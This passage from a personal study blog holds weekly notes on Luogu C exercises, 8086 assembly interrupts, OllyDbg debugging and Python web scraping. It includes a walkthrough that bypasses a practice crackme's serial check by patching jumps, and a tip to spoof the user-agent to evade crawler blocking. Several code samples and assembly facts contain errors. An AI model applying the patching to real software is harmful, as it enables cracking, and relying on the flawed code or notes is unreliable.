得到代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">		sum+=a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sum=sum/n;</span><br><span class="line">    <span class="comment">//均分过程：</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]-sum!=<span class="number">0</span>)&#123;</span><br><span class="line">			a[i+<span class="number">1</span>]+=a[i]-sum,</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,cnt);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="P1548-棋盘问题">P1548 棋盘问题</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llKFs.png" alt=" "></p>
<p> <br>
思路：只会枚举<br>
<img src="https://s2.ax1x.com/2020/02/23/3lleeg.md.png" alt=""><br>
(突然发现多弄了一个点上去…)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="keyword">int</span> rectangle=<span class="number">0</span>,square=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>;a&lt;m+<span class="number">1</span>;a++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;n+<span class="number">1</span>;b++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> x=a+<span class="number">1</span>;x&lt;m+<span class="number">1</span>;x++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> y=b+<span class="number">1</span>;y&lt;n+<span class="number">1</span>;y++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(a-x==b-y)</span><br><span class="line">						square++;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						rectangle++;</span><br><span class="line">						</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,square,rectangle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>汇编学习</h1>
<h3 id="中断过程">中断过程</h3>
<p>cpu的硬件自动完成：用中断类型码找到中断向量，并用它设置cs和ip 这个工作的过程<br>
cpu在完成中断处理程序后，返回原来的执行点继续执行下面的指令。所以在设置cs:ip之前，还要将原来的cs和ip的值保存起来（同样，在使用call指令时也先保存当前cs和ip的值，再设置cs和ip）<br>
8086cpu收到中断信息后引发的中断过程：</p>
<ol>
<li>取得中断类型码</li>
<li>标志寄存器入栈</li>
<li>设置标志寄存器TF和IF值位0</li>
<li>cs内容入栈</li>
<li>ip内容入栈</li>
<li>从内存地址为中断类型码 *4和中断类型码 *4+2的两个字单元中读取中断处理程序的入口设置为cs和ip</li>
</ol>
<p>即：</p>
<ol>
<li>取得中断类型码N</li>
<li>pushf</li>
<li>TF=0,IF=0</li>
<li>push cs</li>
<li>push ip</li>
<li>(ip)=(N* 4),(cs)=(N* 4+2)</li>
</ol>
<h3 id="中断处理程序和iret指令">中断处理程序和iret指令</h3>
<p>由于cpu随时都可能检测到中断信息，随时都可能执行中断处理程序，所以中断处理程序必须一直储存在内存某段空间之中。<br>
中断处理程序的编写步骤：</p>
<ol>
<li>保存用到的寄存器</li>
<li>处理中断</li>
<li>恢复用到的寄存器</li>
<li>用iret指令返回</li>
</ol>
<p>iret指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">popf</span><br></pre></td></tr></table></figure>
<p> </p>
<p>8086支持256个中断，但系统中要处理的中断事件没有达到256个，所以在中断向量表中，许多单元都是空的</p>
<h3 id="单步中断">单步中断</h3>
<p>cpu在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断<br>
引发中断过程：</p>
<ol>
<li>取得中断类型码1</li>
<li>标志寄存器入栈，TF、IF设置为0<br>
#否则cpu永远只能执行单步中断处理程序的第一条指令</li>
<li>cs、ip 入栈</li>
<li>(ip)=(1* 4),(cs)=(1* 4+2)</li>
</ol>
<p>如果cpu不提供其他功能，只要cpu一加电，它就从预设的地方自动向下一直读取指令执行<br>
debug利用了cpu提供的功能，在使用T命令时，debug将TF设置为1<br>
cpu提供单步中断功能的原因：单步跟踪程序的执行过程</p>
<p>IF：中断允许标志位。控制cpu是否允许接收外部中断请求。若IF=1，8086能响应外部中断</p>
<h3 id="响应中断的特殊情况">响应中断的特殊情况</h3>
<p>如：</p>
<blockquote>
<p>在执行完向ss寄存器传送数据的指令后，即使发生中断，cpu也不会响应<br>
（<a href="https://brubbish.github.io/19661.html%EF%BC%89">https://brubbish.github.io/19661.html）</a></p>
</blockquote>
<p>如果在执行完设置ss的指令后 cpu响应中断，需要在栈中压入标志寄存器、cs和ip的值。而ss改变，sp未改变，ss：sp指向错误的栈顶，将引起错误。</p>
<p>应该利用这个特性，将设置ss和sp的指令连续存放</p>
<h3 id="int指令">int指令</h3>
<p>cpu执行int n 指令，相当于引发一个n号中断的过程：</p>
<ol>
<li>取中断类型码n</li>
<li>标志寄存器入栈，IF=0,TF=0</li>
<li>cs、ip 入栈</li>
<li>(ip)=(n *4), (cs)=(n *4+4)</li>
</ol>
<p>int 指令的最终功能与call指令相似，都是调用一段程序</p>
<h3 id="DOS中-断例程应用-中断例程">DOS中 断例程应用(中断例程)</h3>
<p>int 21h 中断例程是dos提供的中断例程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>是int 21h中断例程的4ch号功能等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah,4h       ;程序返回</span><br><span class="line">mov al,0        ;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>(ah)=4ch代表调用第21h号中断例程的4ch号子程序</p>
<h2 id="端口">端口</h2>
<p>各种存储器都和cpu的地址线、数据线、控制线相连。cpu在操作它们的时候，把他们都当作内存对待，把它们总的看做一个由若干存储单元组成的逻辑存储器（内存地址空间）<br>
和cpu通过总线相连的芯片除了存储器外，还有：</p>
<ol>
<li>接口卡上的接口芯片</li>
<li>主板上的接口芯片，cpu通过它们对部分外部设备进行访问</li>
<li>其他芯片</li>
</ol>
<p>在这些芯片中，都有一组可由cpu读写的寄存器，这些寄存器通过芯片和cpu的总线相连。cpu将这些寄存器当作端口，对它们进行统一编址，从而建立了统一的端口地址空间。</p>
<p>cpu可以直接读写：cpu内部寄存器、内存单元、端口 的数据</p>
<h3 id="端口的读写">端口的读写</h3>
<p>cpu最多可以定位64kb个不同的端口，端口地址范围为：0~65535<br>
端口的读写指令只有  in（从端口读取）和out（往端口写入)<br>
在in和out指令中，只能使用ax或al来存放读入或发送的数据。8位端口用al，16位端口用ax<br>
对0~255的端口进行读写时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al,20h</span><br><span class="line">out 20h,al</span><br></pre></td></tr></table></figure>
<p>对255~65535的端口进行读写时端口号放在dx中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dx,3f8h</span><br><span class="line">in al,dx</span><br><span class="line">out dx,al</span><br></pre></td></tr></table></figure>
<h3 id="CMOS-RAM芯片">CMOS RAM芯片</h3>
<p>包含一个实时钟和128个字节的ram存储器<br>
由电池供电，关机后仍然工作，ram中信息不丢失<br>
一部分单元保存时间信息，其余大部分单元保存系统配置信息<br>
有两个端口，70h为地址端口，71h为数据端口</p>
<h2 id="shl和shr指令">shl和shr指令</h2>
<p>shl是逻辑左移指令，移出的最后一位写入cf中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">shl al,1          ;将al中的数据左移一位</span><br></pre></td></tr></table></figure>
<p>执行后(al)=10010000, cf=0</p>
<p>移动位数大于1时，将移动位数放在cl中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure>
<p> <br>
shr是逻辑右移指令，移出的最后一位写入cf中</p>
<p>左移一位相当于X=X*2,右移一位相当于X=X/2</p>
<h3 id="CMOS-RAM中储存的时间信息">CMOS RAM中储存的时间信息</h3>
<p>CMOS RAM中存放着年月日时分秒，这六个信息长度都为一个字节，以BCD码的方式存放。</p>
<h4 id="BCD码">BCD码</h4>
<p>以四位二进制数表示十进制数的编码方式<br>
一个字节可以表示两个BCD码，高4位表示十位，低4位表示个位</p>
<h2 id="外中断">外中断</h2>
<p>及时处理外设的输入需要解决：1.cpu如何得知外设输入的时间 2.cpu从何处得到外设的输入</p>
<h3 id="外中断信息">外中断信息</h3>
<p>当cpu外部有需要处理的事情发生的时候，相关芯片将向cpu发出相应的中断信息。cpu在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入</p>
<h4 id="外中断源：">外中断源：</h4>
<ul>
<li>可屏蔽中断</li>
</ul>
<p>是cpu可以不响应的外中断。如果IF=1，则cpu在执行完当前指令后响应中断；如果IF=0，则不响应可屏蔽中断<br>
中断类型码由数据总线送入cpu，不由cpu产生</p>
<p>8086提供的设置IF指令：<br>
1.sti—设置IF=1<br>
2.cli—设置IF=0</p>
<ul>
<li>不可屏蔽中断</li>
</ul>
<p>是cou必须响应的外中断。<br>
对于8086cpu，不可屏蔽中断的中断类型码固定为2</p>
<p>几乎所有由外设引发的外中断都是可屏蔽中断<br>
不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知cpu的中断信息</p>
<h3 id="pc机键盘的处理过程">pc机键盘的处理过程</h3>
<ol>
<li>键盘输入<br>
按下一个键时，键盘中的芯片产生一个扫描码（通码），说明了按下的建在键盘上的位置；松开按下的键时，也产生一个扫描码（断码），送入60h端口<br>
扫描码的长度为一个字节，通码第七位为0，断码第七位为1：通码+80h=通码</li>
<li>引发9号中断<br>
相关芯片向cpu发出中断类型码为9的可屏蔽中断信息</li>
<li>执行int 9 中断例程<br>
BIOS提供了int 9中断例程，用来进行基本的键盘输入处理：<br>
1.读出扫描码<br>
2.如果是字符键的扫描码，将该扫描码和对应的ASCII码送入内存中的BIOS键盘缓冲区；如果是控制键，则将其转变为状态字节（二进制位控制状态的字节）写入内存中储存状态字节的单元<br>
3.对键盘系统进行相关控制</li>
</ol>
<p>BIOS键盘缓冲区是系统启动后，BIOS用于存放INT 9中断例程所接收的键盘输入的内存区。可以储存15个键盘输入，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码</p>
<h2 id="直接定址表">直接定址表</h2>
<h3 id="描述了单元长度的标号">描述了单元长度的标号</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br></pre></td></tr></table></figure>
<p>a,b 后面没有’:’ ，这种标号不但表示了内存单元的地址，还表示了内存单元的长度，即字节单元(db)或字单元(dw)或双子单元(dd)</p>
<p>offset操作符：取得标号的段地址（<a href="https://brubbish.github.io/34199.html#offset">https://brubbish.github.io/34199.html#offset</a> ）<br>
seg操作符：取得标号的段地址</p>
<h1>OllyDbg 学习</h1>
<h2 id="32位寄存器">32位寄存器</h2>
<p>有EAX、ECX、EDX、EBX、ESP、EBP、ESI等。<br>
调试时可以双击寄存器，修改寄存器的值。对EIP寄存器需要在反汇编窗口选择新的指令起始地址（‘New origin here’）<br>
标志寄存器：C、P、A、Z、S、T、D、O,双击值可以在0和1值切换</p>
<h2 id="单步跟踪快捷键">单步跟踪快捷键</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F7    单步步进，遇到call指令跟进</span><br><span class="line">F8    单步步过，遇到call指令不跟进</span><br><span class="line">F9+CTRL   直到出现ret/retf/iret指令中断</span><br><span class="line">F9+Alt    回到应用程序领空</span><br><span class="line">F9    运行程序</span><br><span class="line">F2    设置断点</span><br><span class="line">F2+CTRL   重新调试</span><br><span class="line">F12   暂停程序</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="一个TraceMe">一个TraceMe</h2>
<p>win32位获取文本框中内容的函数：<br>
GetDlgItemTextA<br>
GetDlgItemTextW<br>
GetWindowTextA<br>
GetWindowTextW<br>
用’CTRL+G’打开跟随表达式窗口进行搜索</p>
<p>在函数入口处设一个断点，程序执行到此处暂停<br>
<img src="https://s2.ax1x.com/2020/02/21/3KiIIJ.png" alt=""><br>
然后按’F9+Alt’跳到调用函数的位置<br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KEqte.png" alt=""><br>
004011E5-004011F5是用来判断用户名和序列号的<br>
顺便：因为真没见过test指令所以搜了一下：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kOTg5NDAzNzI5YWI=">汇编语言–test和cmp区别<i class="fa fa-external-link-alt"></i></span><br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KiTi9.png" alt=""><br>
执行到004011F5处，为了不跳转，把ZF寄存器取反或把此处指令改为nop<br>
另外，程序限制字符要大于4个，在004011D5的位置。可以把此处跳转的指令（jl）改为nop，或把SF值和OF值改为相同。<br>
<img src="https://s2.ax1x.com/2020/02/21/3Ki5a4.png" alt="..."></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.24-2020.03.01</title>
    <url>/9fec375a.html</url>
    <content><![CDATA[<h1>OllyDbg 学习</h1>
<h2 id="常用断点">常用断点</h2>
<h3 id="int-interrupt-3断点">int(interrupt) 3断点</h3>
<p>在OD中用’F2’来设置，机器码是0xCC<br>
执行一个int 3断点时，该地址处的指令首字节修改位CC（OD显示的还是原来的指令）</p>
<p>优点是可以设置无数个指令，缺点是<strong>改变了原程序机器码，容易被软件检测到</strong>，例如有些软件会检测api的首地址是否为0xCC</p>
<h3 id="硬件断点">硬件断点</h3>
<p>和DRx调试寄存器有关<br>
DRx调试器共有8个（x从0 ~ 7）</p>
<p><img src="https://s2.ax1x.com/2020/02/24/3G1qVf.png" alt=" "></p>
<span id="more"></span>
<p>0 ~ 3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点<br>
4、5：（先不做了解）<br>
6：调试寄存器组状态寄存器（‘这个寄存器主要是在调试异常产生后，报告产生调试异常的相关信息’)<br>
7：调试寄存器组控制寄存器，控制调试<br>
硬件断点的原理是使用DR0、DR1、DR2、DR3设定地址，并用DR7设定状态，因此最多设置4个断点<br>
设置方法为：1.在代码行单击右键，执行’断点’-&gt;‘硬件执行 2.在数据窗口’右键’-&gt;‘硬件访问断点’-&gt;（选择数据长度1/2/4字节），如4字节（Dword)当访问xxxxx0~xxxxx3的内存时会被断下</p>
<p>快捷键’F4’执行到光标所在的行</p>
<h3 id="内存断点">内存断点</h3>
<p>原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常，OD比较异常地址是不是断点地址，如果是就中断<br>
设置内存断点在每次出现异常时都需要比较来判断是否应该中断，所以会降低OD的执行速度<br>
OD只能下一个内存断点，设置方法为：在数据/代码窗口选中要下断点的地址区域，右键执行’断点’-&gt;‘内存写入’<br>
硬件访问/写入断点实在触发硬件断点的下一条指令处下断；内存断点是在触发断点的指令处下断。<br>
内存断点不修改原始代码，不会因为被程序校验而失败</p>
<h3 id="内存访问一次性断点">内存访问一次性断点</h3>
<p>windows 对内存使用段页式的管理方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(quote):</span><br><span class="line">段页式存储管理方式即先将用户程序分成若干个段，再把每个段分成若干个页，并为每一个段赋予一个段名。</span><br><span class="line">（基本分段存储管理方式和基本分页存储管理方式原理的结合）</span><br></pre></td></tr></table></figure>
<p>快捷键’Alt+M’显示内存，可以看到许多段，每个段都有不可访问、读、写、执行属性<br>
可用’F2’对整个段设置断点。当所在段被读取或执行时，中断发生，断点删除。</p>
<h3 id="消息断点">消息断点</h3>
<p>当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断<br>
消息断点与INT 3断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建后才能设置</strong></p>
<p>当用户点击按钮、移动光标、输入文字时，一条消息就会发送给当前窗体。发送的信息有4个参数：1个窗口句柄，1个消息编号，2个32位长的参数。<br>
设置方法：工具栏中的’w’按钮，在条目上单击右键…。</p>
<p>ps：<em>当单击按钮并松开时会发送’WM_LBUTTONUP’这个消息。</em></p>
<h3 id="条件断点">条件断点</h3>
<p>在满足一定条件时才会中断。OD中可以按寄存器、储存器、消息等设断点。<br>
用带有条件表达式的INT 3 断点，当调试器遇到断点时，计算表达式的值，如果表达式有效则断点生效。</p>
<ol>
<li>按寄存器条件中断<br>
快捷键’Shift+F2’ 条件表达式例如：  eax==0400000</li>
<li>按存储器条件中断<br>
<em>（CreateFileA函数用于打开文件，可对其设断）</em><br>
在栈窗口右键，执行’Address’-&gt;'Relative to ESP’可看到各个参数相对于当前ESP的地址，如果要得到第一个参数的地址，可以用[ESP+4],如果要得到指向的字符串，使用[[ESP+4]],表达式可用：[STRING [ESP+4]]==“…”(STRING前缀是“以0结尾的ASCII字符串”,还有UNICODE前缀等)</li>
</ol>
<h3 id="条件记录断点">条件记录断点</h3>
<p>可以记录断点处函数表达式或参数的值，也可以设置断点次数，每次符合条件暂停后计数值-1<br>
快捷键’Shift+F4’打开条件记录窗口<br>
条件记录断点可以向插件传递多个命令</p>
<h2 id="插件">插件</h2>
<p>OD只能加载32个插件<br>
添加插件可通过将插件复制到’plugin’文件夹中</p>
<h2 id="Run-trace">Run trace</h2>
<p>把程序执行过的指令保存下来。<br>
将地址、寄存器等记录到Run tarce 缓冲区中。如果缓冲区太小可能造成缓冲区溢出，OD会自动丢弃旧记录。<br>
数据可以在’查看’-&gt;‘RUN跟踪’里（或按’…‘）查看。使用’+‘和’-'浏览程序执行路线</p>
<h2 id="Hit-trace">Hit trace</h2>
<p>分辨哪一部分代码被执行了，哪一部分没有执行。在遇到一段跳转分支比较多的代码，需要了解程序执行路线时，可以用Hit trace。<br>
选中代码-&gt;右键-&gt;‘Hit trace’-&gt;‘Add selection’<br>
效果是执行过的指令前为红色，未执行的为蓝色：<br>
<img src="https://s2.ax1x.com/2020/02/28/3D6OqU.png" alt=""></p>
<p>ps：<strong>不要在监视的代码中设置断点</strong></p>
<h2 id="OD常见问题">OD常见问题</h2>
<h3 id="乱码">乱码</h3>
<ol>
<li>右键’分析’-&gt;‘分析代码’或快捷键’Ctrl+A’</li>
<li>右键’分析’-&gt;‘从模块中删除分析’，或在udd文件夹中删除相应文件</li>
</ol>
<h3 id="在反汇编窗口输入’push-E000’不能正确识别">在反汇编窗口输入’push E000’不能正确识别</h3>
<p>改为’push 0E000’</p>
<h3 id="od’假死’">od’假死’</h3>
<p>可能在调试加壳程序时产生<br>
打开’ollydbg.ini’设置’Restore windows 0’</p>
<h1>静态分析技术</h1>
<p>用高级语言写的程序有两种形式。</p>
<ol>
<li>程序被编译成机器语言在cpu上执行<br>
对于这种程序，可以将机器语言转化为汇编语言，这个过程称为<strong>反汇编</strong></li>
<li>边解释边执行（编写这种程序的语言称为解释性语言，如java）<br>
这种语言编译程序后可以被还原成高级语言的原始结构，这个过程被称为<strong>反编译</strong></li>
</ol>
<p>静态分析：通过反编译、反汇编获得程序的汇编代码或源代码，然后分析流程，了解模块的功能</p>
<h2 id="文件类型分析">文件类型分析</h2>
<p>逆向分析程序的第一步<br>
了解编写程序的语言、编译的编译器或是否被加密<br>
各种开发语言都有固定的启动代码，被加密程序处理过的程序中会留下加密软件的相关信息<br>
但有些外壳程序会将一些加壳信息去除，并伪造启动代码，从而欺骗了PEiD等检测分析软件。因此识别工具给出的结果只能作为参考</p>
<h2 id="IDA">IDA</h2>
<p>ida 是按区块装载pe文件的，例如.text代码块、.data数据块、.rsrc资源块、.idata输入表、.edata输出表。<br>
反编译过程分为两个阶段：</p>
<ol>
<li>将代码和数据分开，分析函数的参数调用、跳转等</li>
<li>装载对应的编译器特征文件，给各个函数赋名</li>
</ol>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>python 爬虫学习</title>
    <url>/710f8e5f.html</url>
    <content><![CDATA[<p>就此开一篇单独记录 py 爬虫的学习<u>以及实操中遇到的问题</u>(可能吧)<br>
（分割线用（***或—））</p>
<h2 id="more"><span id="more"></span></h2>
<h1>爬虫入门</h1>
<p>以下为 mooc 上 BIT 嵩天老师课程<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWNvdXJzZTE2My5vcmcvbGVhcm4vQklULTEwMDE4NzAwMDE/dGlkPTEyMDY5NTEyNjgjL2xlYXJuL2Fubm91bmNl">Python 网络爬虫与信息提取<i class="fa fa-external-link-alt"></i></span>的学习</p>
<h2 id="requests-库">requests 库</h2>
<h3 id="安装">安装</h3>
<p>管理员打开 cmd，安装 requests 库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests </span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyB5j.md.png" alt="以此检测安装成功"></p>
<h4 id="tip：-pip-下载超时（timeout）">tip： pip 下载超时（timeout）</h4>
<p>cmd 输入指令：</p>
<ol>
<li>pip --default-timeout=100 install -U pip</li>
</ol>
<p>或</p>
<ol start="2">
<li>pip install pip -U</li>
</ol>
<p>pip config set global.index-url <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnR1bmEudHNpbmdodWEuZWR1LmNuL3NpbXBsZQ==">https://pypi.tuna.tsinghua.edu.cn/simple<i class="fa fa-external-link-alt"></i></span><br>
（升级 pip 后更换为的清华镜像）</p>
<h3 id="r-request-get-url">r=request.get(url)</h3>
<p>构造一个向服务器请求资源的 request 对象，返回一个包含服务器资源的 response 对象<br>
response 对象包含了服务器返回的所有信息</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8tysGn.md.png" alt="8tysGn.md.png"></p>
<p>r.apparent_encoding: 根据网页内容分析出的编码方式<br>
r.encoding: 如果 header 中不存在 charset，则默认编码为 ISO-8859-1</p>
<h3 id="爬取网页的通用代码框架">爬取网页的通用代码框架</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyy2q.md.png" alt="8tyy2q.md.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requsets</span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 判断状态  如果不是200，则引发HTTPError异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;产生异常&quot;</span></span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;getHTMLText(url))</span></span><br></pre></td></tr></table></figure>
<p>try：python 捕捉异常语句，详见：<span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLWV4Y2VwdGlvbnMuaHRtbA==">https://www.runoob.com/python/python-exceptions.html<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="requests-库主要方法">requests 库主要方法</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8ty6x0.md.png" alt="8ty6x0.md.png"></p>
<p>requests.request(method, url, **kwargs)<br>
requests.get(url, params=None, **kwargs)<br>
requests.head(url, **kwargs)<br>
requests.post(url, data=None, json=None, **kwargs)<br>
requests.put(url, data=None, **kwargs)<br>
requests.patch(url, data=None, **kwargs)<br>
requests.delete(url, **kwargs)</p>
<h4 id="kwargs">**kwargs:</h4>
<ol>
<li>params：字典或字节序列，作为参数添加到 url 中</li>
<li>data：字典、字节序列或文件对象，作为 request 的内容</li>
<li>json：json 格式的数据，作为 request 的内容</li>
<li>headers：定制 header</li>
<li>cookies</li>
<li>auth</li>
<li>files：传输文件</li>
<li>timeout：设定超时时间，单位为秒</li>
<li>proxies：设置代理服务器</li>
<li>allow_redirects</li>
<li>stream</li>
<li>verify</li>
<li>cert</li>
</ol>
<h3 id="爬虫尺寸">爬虫尺寸</h3>
<p>小规模：爬取网页。数据量小，速度不敏感。使用 requests 库<br>
中规模：爬取网站。数据量大，速度敏感。使用 scrapy 库<br>
大规模：爬取全网。（搜索引擎）</p>
<h3 id="限制爬虫">限制爬虫</h3>
<ol>
<li>来源审查：判断 user-agent</li>
<li>robots 协议</li>
</ol>
<h3 id="robots-协议">robots 协议</h3>
<p>Robots Exclusion Standard<br>
网络爬虫先识别 robots.txt 再进行爬取<br>
robots 协议时建议而非约束性，不遵守的话存在法律风险（类人行为可不参考 robots 协议）</p>
<h3 id="拒绝被爬：尝试修改-user-agent">拒绝被爬：尝试修改 user-agent</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8y3yQ0.md.png" alt="主要为黄色荧光部分"></p>
<h3 id="搜索引擎关键词提交">搜索引擎关键词提交</h3>
<p>百度：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tL3M/d2Q9">https://www.baidu.com/s?wd=<i class="fa fa-external-link-alt"></i></span><u>关键词</u></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">keyword=<span class="string">&quot;xxxx&quot;</span></span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;wd&#x27;</span>:keyword&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com/s&quot;</span>,params=kv)</span><br></pre></td></tr></table></figure>
<h3 id="图片的爬取和存储">图片的爬取和存储</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&quot;....../...jpg&quot;</span></span><br><span class="line">root=<span class="string">&quot;D://pics//&quot;</span></span><br><span class="line">path=root+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]    <span class="comment">#需要import os</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#保存↓</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功“)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;</span>文件已存在<span class="string">&quot;)</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">    print(&quot;</span>失败<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>
<h2 id="BeautifulSoup-库">BeautifulSoup 库</h2>
<p>BeautifulSoup 库是一个解析、遍历、维护标签树的功能库</p>
<h3 id="安装-2">安装</h3>
<p>cmd 下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">或</span><br><span class="line"><span class="keyword">import</span> bs4</span><br></pre></td></tr></table></figure>
<p>作用：html 文档 ↔ 标签树 ↔beautifulsoup 类</p>
